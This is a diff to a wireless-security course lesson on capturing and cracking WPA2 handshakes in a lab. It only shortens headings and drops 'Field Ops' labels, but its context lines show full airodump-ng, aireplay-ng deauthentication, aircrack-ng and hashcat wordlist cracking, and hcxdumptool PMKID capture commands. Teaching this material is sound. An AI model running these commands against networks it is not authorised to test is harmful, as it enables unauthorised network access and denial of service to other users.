@@ -1,4 +1,4 @@
-# 04: Wireless Security & the Aircrack-ng Suite `[Level 2: Wireless Exploitation]`
+# 04: Wireless security & Aircrack-ng `[Level 2: Wireless]`
 <!-- time: ~4 hours (more with hardware) -->
 <!-- outcome: Capture and crack a WPA2 handshake in a lab; understand WPA3 and PMF defenses. -->
 
@@ -126,7 +126,7 @@ sudo airodump-ng --band abg wlan0mon      # scan 2.4 + 5 GHz
 ```
 
 ```bash
-# [Level 2+: Advanced / Field Ops] Lock onto YOUR AP's channel + BSSID and
+# [Level 2+: Advanced] Lock onto YOUR AP's channel + BSSID and
 # write a capture file. -w sets the output prefix; --bssid/-c narrow the focus.
 sudo airodump-ng --bssid AA:BB:CC:11:22:33 -c 6 -w handshake wlan0mon
 # Leave this running. It will write handshake-01.cap, and show:
@@ -143,7 +143,7 @@ immediately reconnects and re-runs the handshake, which your `airodump-ng`
 window records.
 
 ```bash
-# [Level 2+: Advanced / Field Ops] In a SECOND terminal, while airodump-ng runs:
+# [Level 2+: Advanced] In a SECOND terminal, while airodump-ng runs:
 
 # Deauth a SPECIFIC client (most reliable, least disruptive), 10 bursts
 sudo aireplay-ng --deauth 10 -a AA:BB:CC:11:22:33 -c DE:AD:BE:EF:00:01 wlan0mon
@@ -179,7 +179,7 @@ dictionary attack.
 # rockyou.txt ships gzipped on Kali; expand it once before first use:
 sudo gunzip -k /usr/share/wordlists/rockyou.txt.gz
 
-# [Level 2+: Advanced / Field Ops] Dictionary attack against the handshake
+# [Level 2+: Advanced] Dictionary attack against the handshake
 sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt \
                  -b AA:BB:CC:11:22:33 handshake-01.cap
 #   -w wordlist   -b target BSSID   <capture file>
@@ -205,7 +205,7 @@ Expected on success:
 hashcat with the modern `22000` mode:
 
 ```bash
-# [Level 2+: Advanced / Field Ops] Convert .cap -> hashcat 22000 format
+# [Level 2+: Advanced] Convert .cap -> hashcat 22000 format
 hcxpcapngtool -o handshake.22000 handshake-01.cap
 
 # GPU dictionary attack (mode 22000 = WPA-PBKDF2-PMKID+EAPOL)
@@ -222,7 +222,7 @@ Some APs leak a **PMKID** in the first EAPOL frame, no client and no deauth
 required:
 
 ```bash
-# [Level 2+: Advanced / Field Ops] Capture PMKID directly
+# [Level 2+: Advanced] Capture PMKID directly
 # Written for hcxdumptool 7.x, the version Kali ships (`hcxdumptool --version`
 # prints "hcxdumptool 7.1.2" at the time of writing). It drives the adapter
 # itself: give it the MANAGED interface (wlan0, not wlan0mon), don't run
